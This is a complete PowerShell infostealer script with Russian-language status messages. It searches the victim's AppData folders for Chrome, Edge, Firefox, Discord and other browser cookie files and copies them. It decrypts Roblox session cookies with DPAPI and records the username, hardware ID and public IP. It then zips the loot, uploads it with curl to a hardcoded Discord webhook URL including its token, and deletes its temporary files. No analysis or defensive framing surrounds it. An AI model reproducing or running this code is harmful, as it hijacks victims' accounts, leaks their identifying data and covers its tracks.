$webhook = "https://discord.com/api/webhooks/1517874969986732133/srfBAzpYR38NikmVRgDs5AoroLpvV4uBQDpjWtvLymm_qGHcY2AOMF1zDNHXDH0JrOaz"

$d = "$env:TEMP\Zeta_Cookies"
md $d -Force | Out-Null

$found = @()
$searchPaths = @($env:APPDATA, $env:LOCALAPPDATA, (Join-Path $env:LOCALAPPDATA '..\LocalLow'))

foreach ($base in $searchPaths) {
    if (Test-Path $base) {
        $files = Get-ChildItem -Path $base -Recurse -Filter 'Cookies' -File -ErrorAction SilentlyContinue |
            Where-Object { 
                $_.DirectoryName -and ($_.DirectoryName -match 'discord|chrome|edge|brave|opera|vivaldi|firefox|mozilla|ntfloader|ebwebview|webview' -or $_.FullName -match 'Cookies$')
            }
        if ($files) { $found += $files }
    }
}

foreach ($f in $found) {
    if (-not $f) { continue }
    $src = $f.FullName
    $name = "unknown_cookie.cookies"
    try {
        if ($f.Directory.Parent -and $f.Directory.Name) {
            $name = $f.Directory.Parent.Name + '_' + $f.Directory.Name + '.cookies'
        } elseif ($f.Directory.Name) {
            $name = $f.Directory.Name + '.cookies'
        }
        if ($name.Length -gt 60 -and $f.Directory.Parent -and $f.Directory.Parent.Parent -and $f.Directory.Parent.Name) {
            $name = $f.Directory.Parent.Parent.Name + '_' + $f.Directory.Parent.Name + '.cookies'
        }
    } catch {
        $name = [System.IO.Path]::GetFileName($src) + '_' + (Get-Random -Max 9999) + '.cookies'
    }
    $dest = Join-Path $d $name
    try { Copy-Item -Path $src -Destination $dest -Force -ErrorAction Stop } catch { 
        Write-Host "⚠️ Скипнули файл: $src"
    }
}

$rob = $env:LOCALAPPDATA + '\Roblox\LocalStorage\RobloxCookies.dat'
if (Test-Path $rob) {
    Copy-Item $rob "$d\RobloxCookies.dat" -Force -ErrorAction SilentlyContinue
    try {
        $c = Get-Content $rob -Raw | ConvertFrom-Json -ErrorAction Stop
        if ($c -and $c.CookiesData) {
            $b = [Convert]::FromBase64String($c.CookiesData)
            Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
            $s = [System.Security.Cryptography.ProtectedData]::Unprotect($b, $null, 'CurrentUser')
            $t = [Text.Encoding]::UTF8.GetString($s)
            $t | Out-File "$d\RobloxCookies_decrypted.txt" -ErrorAction SilentlyContinue
        }
    } catch { 
        Write-Host "⚠️ Скипнули расшифровку Roblox"
    }
}

$u = $env:USERNAME
try {
    $h = (Get-CimInstance Win32_ComputerSystemProduct).UUID
} catch {
    $h = "UNKNOWN_HWID"
}
try {
    $i = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -ErrorAction Stop).Content
} catch {
    $i = "IP_NOT_FOUND"
}
"User: $u`nHWID: $h`nIP: $i" | Out-File "$d\info.txt" -ErrorAction SilentlyContinue

$zip = "$env:TEMP\cookies.zip"
if (Test-Path $zip) { Remove-Item $zip -Force -ErrorAction SilentlyContinue }
Compress-Archive -Path $d -DestinationPath $zip -Force -ErrorAction SilentlyContinue

if (Test-Path $zip) {
    curl.exe -F "file=@$zip" $webhook
} else {
    Write-Host "❌ Зип не создался, отправка похуй"
}

Remove-Item $zip -Force -ErrorAction SilentlyContinue
Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "✅ Отправлено через curl!"
